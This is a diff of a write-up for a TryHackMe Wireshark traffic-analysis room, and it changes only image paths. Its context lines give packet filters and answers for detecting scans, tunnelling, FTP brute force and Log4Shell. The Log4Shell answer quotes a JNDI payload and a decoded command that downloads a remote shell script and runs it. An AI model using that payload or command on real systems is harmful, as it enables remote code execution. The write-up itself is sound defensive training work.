@@ -6,7 +6,7 @@ tags: [wireshark, packet-analysis, pcap, network-forensics, tcp-ip, arp-spoofing
 ---
 
 ## Overview
-![Room banner](/assets/img/thm-Wireshark-Traffic-Analysis/wireshark.png)
+![Room banner](/assets/img/thm-Wireshark-traffic-analysis/wireshark.png)
 
 **Room:** [Wireshark: Traffic Analysis](https://tryhackme.com/room/wiresharktrafficanalysis)
 
@@ -26,7 +26,7 @@ tags: [wireshark, packet-analysis, pcap, network-forensics, tcp-ip, arp-spoofing
 
 Filter: `tcp.flags.syn == 1 and tcp.flags.ack == 0 and tcp.window_size > 1024`
 
-![TCP Connect scan count](/assets/img/thm-Wireshark-Traffic-Analysis/no-of-tcp-connect.png)
+![TCP Connect scan count](/assets/img/thm-Wireshark-traffic-analysis/no-of-tcp-connect.png)
 
 **A: `1000`** — status bar shows Displayed: 1000 (15.3%) with that filter active.
 
@@ -42,7 +42,7 @@ Filter: `tcp.flags.syn == 1 and tcp.flags.ack == 0 and tcp.window_size > 1024`
 
 Filter: `icmp.type == 3 and icmp.code == 3`
 
-![UDP close port message count](/assets/img/thm-Wireshark-Traffic-Analysis/no-of-udp-scan.png)
+![UDP close port message count](/assets/img/thm-Wireshark-traffic-analysis/no-of-udp-scan.png)
 
 **A: `1083`** — status bar shows Displayed: 1083 (16.5%).
 
@@ -60,7 +60,7 @@ Filter: `icmp.type == 3 and icmp.code == 3`
 
 Filter: `((arp) && (arp.opcode == 1)) && (eth.src == 00:0c:29:e2:18:b4)`
 
-![ARP requests crafted by the attacker](/assets/img/thm-Wireshark-Traffic-Analysis/arp-request.png)
+![ARP requests crafted by the attacker](/assets/img/thm-Wireshark-traffic-analysis/arp-request.png)
 
 **A: `284`** — status bar shows Displayed: 284 (9.9%).
 
@@ -82,7 +82,7 @@ The confirmation step (not a graded question, but part of the investigation) was
 
 Filter: `nbns.name contains "LIVALJM" and nbns.flags.opcode == 5`
 
-![LIVALJM NBNS registration count](/assets/img/thm-Wireshark-Traffic-Analysis/LIVALJM.png)
+![LIVALJM NBNS registration count](/assets/img/thm-Wireshark-traffic-analysis/LIVALJM.png)
 
 **A: `16`** — status bar shows Displayed: 16 (0.0%).
 
@@ -92,7 +92,7 @@ Filter: `nbns.name contains "LIVALJM" and nbns.flags.opcode == 5`
 
 Filter: `dhcp.option.requested_ip_address == 172.16.13.85`
 
-![Host requesting a specific IP via DHCP](/assets/img/thm-Wireshark-Traffic-Analysis/requested-ip.png)
+![Host requesting a specific IP via DHCP](/assets/img/thm-Wireshark-traffic-analysis/requested-ip.png)
 
 **A: `Galaxy-A12`** — Option (12) Host Name in the DHCP Request packet.
 
@@ -102,7 +102,7 @@ Filter: `dhcp.option.requested_ip_address == 172.16.13.85`
 
 Filter: `kerberos.CNameString contains "u5"`
 
-![Source IP for Kerberos user u5](/assets/img/thm-Wireshark-Traffic-Analysis/u5.png)
+![Source IP for Kerberos user u5](/assets/img/thm-Wireshark-traffic-analysis/u5.png)
 
 **A: `10[.]1[.]12[.]2`** — the AS-REQ packet's source address, with `CNameString: u5` confirmed in the request body.
 
@@ -112,7 +112,7 @@ Filter: `kerberos.CNameString contains "u5"`
 
 Filter: `kerberos.CNameString contains "$"`
 
-![Kerberos hostname (dollar-suffixed CNameString)](/assets/img/thm-Wireshark-Traffic-Analysis/all-hostname.png)
+![Kerberos hostname (dollar-suffixed CNameString)](/assets/img/thm-Wireshark-traffic-analysis/all-hostname.png)
 
 **A: `xp1`** — `CNameString: xp1$`. The trailing `$` is what marks it as a hostname rather than a username (per the room's own filter convention: exclude `$`-suffixed values to isolate real usernames).
 
@@ -124,7 +124,7 @@ Filter: `kerberos.CNameString contains "$"`
 
 Filter: `data.len > 256 and icmp`, then read the encapsulated payload in the ASCII pane.
 
-![ICMP tunnel payload showing SSH key exchange strings](/assets/img/thm-Wireshark-Traffic-Analysis/protocol.png)
+![ICMP tunnel payload showing SSH key exchange strings](/assets/img/thm-Wireshark-traffic-analysis/protocol.png)
 
 **A: `SSH`** — the ICMP payload contains cleartext SSH key-exchange algorithm strings (`diffie-hellman-group-exchange-sha256`, `ssh-rsa`, `aes128-ctr`, etc.), meaning an SSH session is being tunnelled inside ICMP echo packets.
 
@@ -134,7 +134,7 @@ Filter: `data.len > 256 and icmp`, then read the encapsulated payload in the ASC
 
 Filter: `dns.qry.name.len > 15 and !mdns`
 
-![DNS tunnelling — suspicious domain](/assets/img/thm-Wireshark-Traffic-Analysis/malicious-domain-name.png)
+![DNS tunnelling — suspicious domain](/assets/img/thm-Wireshark-traffic-analysis/malicious-domain-name.png)
 
 **A: `dataexfil[.]com`** — the long encoded subdomain label (`8C0701B0DE401CE27058D10012D2F678F9.dataexfil.com`) resolving via CNAME queries is the tunnelling channel.
 
@@ -146,7 +146,7 @@ Filter: `dns.qry.name.len > 15 and !mdns`
 
 Filter: `ftp.response.code == 530`
 
-![FTP failed login count](/assets/img/thm-Wireshark-Traffic-Analysis/failed-login.png)
+![FTP failed login count](/assets/img/thm-Wireshark-traffic-analysis/failed-login.png)
 
 **A: `737`** — status bar shows Displayed: 737 (3.6%).
 
@@ -156,7 +156,7 @@ Filter: `ftp.response.code == 530`
 
 Followed the FTP control stream to the `SIZE resume.doc` request, then checked the matching `213` response.
 
-![FTP SIZE command response for resume.doc](/assets/img/thm-Wireshark-Traffic-Analysis/file-size.png)
+![FTP SIZE command response for resume.doc](/assets/img/thm-Wireshark-traffic-analysis/file-size.png)
 
 **A: `39424 bytes`** — filtering `ftp.response.code == 213` isolates the response: `213 39424`.
 
@@ -166,7 +166,7 @@ Followed the FTP control stream to the `SIZE resume.doc` request, then checked t
 
 Followed the relevant TCP stream (`tcp.stream eq 714`) covering the upload session.
 
-![FTP upload and chmod attempt in the followed stream](/assets/img/thm-Wireshark-Traffic-Analysis/file-name.png)
+![FTP upload and chmod attempt in the followed stream](/assets/img/thm-Wireshark-traffic-analysis/file-name.png)
 
 **A: `README`** — `STOR README` followed by `226 Transfer complete.` confirms the successful upload.
 
@@ -176,7 +176,7 @@ Followed the relevant TCP stream (`tcp.stream eq 714`) covering the upload sessi
 
 Same followed stream as above.
 
-![SITE CHMOD command attempt](/assets/img/thm-Wireshark-Traffic-Analysis/special-command.png)
+![SITE CHMOD command attempt](/assets/img/thm-Wireshark-traffic-analysis/special-command.png)
 
 **A: `SITE CHMOD 777 resume.doc`** — attempted against `resume.doc` specifically (not the uploaded `README`), and the server responded `550 resume.doc: Permission denied`, so the privilege-escalation attempt failed.
 
@@ -188,7 +188,7 @@ Same followed stream as above.
 
 Filter: `http.user_agent`, then visually scanned for UA strings that don't match a real browser/OS combination (here: `Windows NT 6.4`, which isn't a real Windows NT version).
 
-![Anomalous Windows NT 6.4 user-agent strings highlighted](/assets/img/thm-Wireshark-Traffic-Analysis/anomolous-user-agent.png)
+![Anomalous Windows NT 6.4 user-agent strings highlighted](/assets/img/thm-Wireshark-traffic-analysis/anomolous-user-agent.png)
 
 **A: `5`** — five packets carry the fabricated `Windows NT 6.4` user-agent string.
 
@@ -198,7 +198,7 @@ Filter: `http.user_agent`, then visually scanned for UA strings that don't match
 
 Same approach — looked for a UA string mimicking `Mozilla/5.0` with a single swapped character.
 
-![Misspelled user-agent: Mozlila/5.0](/assets/img/thm-Wireshark-Traffic-Analysis/subtle-change.png)
+![Misspelled user-agent: Mozlila/5.0](/assets/img/thm-Wireshark-traffic-analysis/subtle-change.png)
 
 **A: `52`** — the UA string reads `Mozlila/5.0` instead of `Mozilla/5.0`.
 
@@ -208,7 +208,7 @@ Same approach — looked for a UA string mimicking `Mozilla/5.0` with a single s
 
 Filter: `(http.user_agent contains "$") or (http.user_agent contains "==")`
 
-![Log4j JNDI payload in the User-Agent header](/assets/img/thm-Wireshark-Traffic-Analysis/base64-starting-phase.png)
+![Log4j JNDI payload in the User-Agent header](/assets/img/thm-Wireshark-traffic-analysis/base64-starting-phase.png)
 
 **A: `444`** — the User-Agent header contains `${jndi:ldap://45.137.21.9:1389/Basic/Command/Base64/...}`, the JNDI lookup that kicks off the Log4Shell exploit chain.
 
@@ -218,7 +218,7 @@ Filter: `(http.user_agent contains "$") or (http.user_agent contains "==")`
 
 Extracted the base64 blob from packet 444's payload and ran it through CyberChef's **From Base64** recipe.
 
-![CyberChef decoding the base64 Log4j payload](/assets/img/thm-Wireshark-Traffic-Analysis/base64-decode.png)
+![CyberChef decoding the base64 Log4j payload](/assets/img/thm-Wireshark-traffic-analysis/base64-decode.png)
 
 **A: `62[.]210[.]130[.]250`** — decoded command: `wget http://62.210.130.250/lh.sh;chmod +x lh.sh;./lh.sh`.
 
@@ -230,7 +230,7 @@ Extracted the base64 blob from packet 444's payload and ran it through CyberChef
 
 Filter: `tls.handshake.type == 1`, scanned the Server Name in each Client Hello.
 
-![Client Hello to accounts.google.com](/assets/img/thm-Wireshark-Traffic-Analysis/frame.png)
+![Client Hello to accounts.google.com](/assets/img/thm-Wireshark-traffic-analysis/frame.png)
 
 **A: `16`**
 
@@ -240,11 +240,11 @@ Filter: `tls.handshake.type == 1`, scanned the Server Name in each Client Hello.
 
 Set the file via **Edit → Preferences → Protocols → TLS → (Pre)-Master-Secret log filename**, pointed at `Desktop/exercise-pcaps/https/KeysLogFile.txt`.
 
-![TLS preferences — key log file configured](/assets/img/thm-Wireshark-Traffic-Analysis/select-keylogs.png)
+![TLS preferences — key log file configured](/assets/img/thm-Wireshark-traffic-analysis/select-keylogs.png)
 
 Then filtered `http2`:
 
-![HTTP2 packet count after decryption](/assets/img/thm-Wireshark-Traffic-Analysis/after-keylogs-num-of-http2.png)
+![HTTP2 packet count after decryption](/assets/img/thm-Wireshark-traffic-analysis/after-keylogs-num-of-http2.png)
 
 **A: `115`** — status bar shows Displayed: 115 (6.5%).
 
@@ -254,7 +254,7 @@ Then filtered `http2`:
 
 Expanded the decrypted HTTP2 headers on frame 322.
 
-![HTTP2 :authority header on frame 322](/assets/img/thm-Wireshark-Traffic-Analysis/authority-header.png)
+![HTTP2 :authority header on frame 322](/assets/img/thm-Wireshark-traffic-analysis/authority-header.png)
 
 **A: `safebrowsing[.]googleapis[.]com`**
 
@@ -264,7 +264,7 @@ Expanded the decrypted HTTP2 headers on frame 322.
 
 Used **File → Export Objects → HTTP** to pull the object served from `situla.bitbit.net`, saved it, and opened it in a text editor.
 
-![Exported object opened in text editor, revealing the flag](/assets/img/thm-Wireshark-Traffic-Analysis/flag-found.png)
+![Exported object opened in text editor, revealing the flag](/assets/img/thm-Wireshark-traffic-analysis/flag-found.png)
 
 **A: `FLAG{THM-PACKETMASTER}`**
 
@@ -276,7 +276,7 @@ Used **File → Export Objects → HTTP** to pull the object served from `situla
 
 **Tools → Credentials** was used to list every cleartext credential Wireshark's dissectors could extract.
 
-![Credentials tool showing the HTTP Basic Auth entry](/assets/img/thm-Wireshark-Traffic-Analysis/basic-auth.png)
+![Credentials tool showing the HTTP Basic Auth entry](/assets/img/thm-Wireshark-traffic-analysis/basic-auth.png)
 
 **A: `237`** — the only `HTTP` protocol row in the credentials list, username `afiiskc`.
 
@@ -286,7 +286,7 @@ Used **File → Export Objects → HTTP** to pull the object served from `situla
 
 Same Credentials window, cross-referenced with the FTP `PASS` command in packet 170.
 
-![Empty FTP PASS command](/assets/img/thm-Wireshark-Traffic-Analysis/no-pass.png)
+![Empty FTP PASS command](/assets/img/thm-Wireshark-traffic-analysis/no-pass.png)
 
 **A: `170`** — `PASS` sent with no argument, tied to the `adminis...` username registered in packet 136.
 
